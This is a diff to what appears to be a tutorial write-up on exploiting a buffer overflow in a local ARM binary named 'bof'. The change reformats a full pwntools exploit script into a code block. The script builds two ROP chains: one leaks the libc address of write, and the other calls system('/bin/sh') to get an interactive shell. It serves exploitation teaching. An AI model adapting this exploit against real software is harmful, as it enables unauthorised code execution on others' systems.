@@ -170,138 +170,90 @@ Fig 12 - Second phase of exploit
 
 The complete exploit will look something like this.
 
-_#!/usr/bin/env python3_
-
-_from pwn import \*_
-
-_p = process(&#39;bof&#39;)_
-
-_e = ELF(&#39;bof&#39;)_
-
-_#### Phase 01 - Leaking address of write function_
-
-_# gadgets in \_\_libc\_csu\_init_
-
-_# 0x00010492 \&lt;+38\&gt;: mov r2, r9_
-
-_# 0x00010494 \&lt;+40\&gt;: mov r1, r8_
-
-_# 0x00010496 \&lt;+42\&gt;: mov r0, r7_
-
-_# 0x00010498 \&lt;+44\&gt;: blx r3_
-
-_# 0x0001049a \&lt;+46\&gt;: cmp r6, r4_
-
-_# 0x0001049c \&lt;+48\&gt;: bne.n 0x1048c \&lt;\_\_libc\_csu\_init+32\&gt;_
-
-_# 0x0001049e \&lt;+50\&gt;: ldmia.w sp!, {r3, r4, r5, r6, r7, r8, r9, pc}_
-
-_junk = b&#39;A&#39;\*104_
-
-_gadget1 = 0x0001049e + 1 # one is added to convert in thumb mode_
-
-_gadget2 = 0x00010492 + 1_
-
-_write\_plt = 0x0001035c # write@plt taken from main_
-
-_write\_got = e.got[&#39;write&#39;] # write@got_
-
-_main = 0x10434 + 1 # starting address of main_
-
-_# first rop chain to leak write@GLIBC_
-
-_payload1 = junk_
-
-_payload1 += p32(gadget1)_
-
-_payload1 += p32(write\_plt)_
-
-_payload1 += p32(0x0)_
-
-_payload1 += p32(0x0)_
-
-_payload1 += p32(0x0)_
-
-_payload1 += p32(0x1)_
-
-_payload1 += p32(write\_got)_
-
-_payload1 += p32(0x4)_
-
-_payload1 += p32(gadget2)_
-
-_payload1 += p32(0x0)_
-
-_payload1 += p32(0x0)_
-
-_payload1 += p32(0x0)_
-
-_payload1 += p32(0x0)_
-
-_payload1 += p32(0x0)_
-
-_payload1 += p32(0x0)_
-
-_payload1 += p32(0x0)_
-
-_payload1 += p32(main)_
-
-_p.recvuntil(&quot;pwn me\n&quot;)_
-
-_p.sendline(payload1)_
-
-_file = open(&quot;payload1.bin&quot;, &quot;wb&quot;) # For debugging purposes_
-
-_file.write(payload1)_
-
-_file.close()_
-
-_leaked\_write = u32(p.recv().strip()[-10:-6])_
-
-_log.success(&#39;Leaked write@GLIBC: &#39; + hex(leaked\_write))_
-
-_#### Phase 02 - Calling System_
-
-_system\_offset = 0x60910 # difference between write and system address_
-
-_binsh\_offset = 0x49814 # difference between write and /bin/sh address_
-
-_system = (leaked\_write - system\_offset) # to get the randomized address of system_
-
-_log.success(&#39;Leaked system@GLIBC: &#39; + hex(system))_
-
-_binsh = (leaked\_write + binsh\_offset) - 1 # to get the randomized address of /bin/sh_
-
-_log.success(&#39;Leaked /bin/sh: &#39; + hex(binsh)) # 1 is subtracted to convert in thumb mode_
-
-_# second rop chain to call system_
-
-_payload2 = junk_
-
-_payload2 += p32(gadget1)_
-
-_payload2 += p32(system)_
-
-_payload2 += p32(0x0)_
-
-_payload2 += p32(0x0)_
-
-_payload2 += p32(0x0)_
-
-_payload2 += p32(binsh)_
-
-_payload2 += p32(0x0)_
-
-_payload2 += p32(0x0)_
-
-_payload2 += p32(gadget2)_
-
-_p.sendline(payload2)_
-
-_p.recv()_
-
-_p.interactive()_
-
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+p = process('bof')
+e = ELF('bof')
+
+#### Phase 01 - Leaking address of write function
+
+# gadgets in __libc_csu_init
+
+#   0x00010492 <+38>:   mov     r2, r9
+#   0x00010494 <+40>:   mov     r1, r8
+#   0x00010496 <+42>:   mov     r0, r7
+#   0x00010498 <+44>:   blx     r3
+#   0x0001049a <+46>:   cmp     r6, r4
+#   0x0001049c <+48>:   bne.n   0x1048c <__libc_csu_init+32>
+#   0x0001049e <+50>:   ldmia.w sp!, {r3, r4, r5, r6, r7, r8, r9, pc}
+
+junk = b'A'*104
+gadget1 = 0x0001049e + 1        # one is added to convert in thumb mode
+gadget2 = 0x00010492 + 1
+write_plt = 0x0001035c          # write@plt taken from main
+write_got = e.got['write']      # write@got
+main = 0x10434 + 1              # starting address of main
+
+# first rop chain to leak write@GLIBC
+payload1 = junk
+payload1 += p32(gadget1)
+payload1 += p32(write_plt)
+payload1 += p32(0x0)
+payload1 += p32(0x0)
+payload1 += p32(0x0)
+payload1 += p32(0x1)
+payload1 += p32(write_got)
+payload1 += p32(0x4)
+payload1 += p32(gadget2)
+payload1 += p32(0x0)
+payload1 += p32(0x0)
+payload1 += p32(0x0)
+payload1 += p32(0x0)
+payload1 += p32(0x0)
+payload1 += p32(0x0)
+payload1 += p32(0x0)
+payload1 += p32(main)
+
+p.recvuntil("pwn me\n")
+p.sendline(payload1)
+
+file = open("payload1.bin", "wb")       # For debugging purposes
+file.write(payload1)
+file.close()
+
+leaked_write = u32(p.recv().strip()[-10:-6])
+log.success('Leaked write@GLIBC: ' + hex(leaked_write))
+
+#### Phase 02 - Calling System
+
+system_offset = 0x60910         # difference between write and system address
+binsh_offset = 0x49814          # difference between write and /bin/sh address
+
+system = (leaked_write - system_offset) # to get the randomized address of system
+log.success('Leaked system@GLIBC: ' + hex(system))
+
+binsh = (leaked_write + binsh_offset) - 1  # to get the randomized address of /bin/sh
+log.success('Leaked /bin/sh: ' + hex(binsh)) # 1 is subtracted to convert in thumb mode
+
+# second rop chain to call system
+payload2 = junk
+payload2 += p32(gadget1)
+payload2 += p32(system)
+payload2 += p32(0x0)
+payload2 += p32(0x0)
+payload2 += p32(0x0)
+payload2 += p32(binsh)
+payload2 += p32(0x0)
+payload2 += p32(0x0)
+payload2 += p32(gadget2)
+
+p.sendline(payload2)
+p.recv()
+p.interactive()
+```
+			 
 ### **Running Exploit**
 
 After running this exploit, we got the shell! 
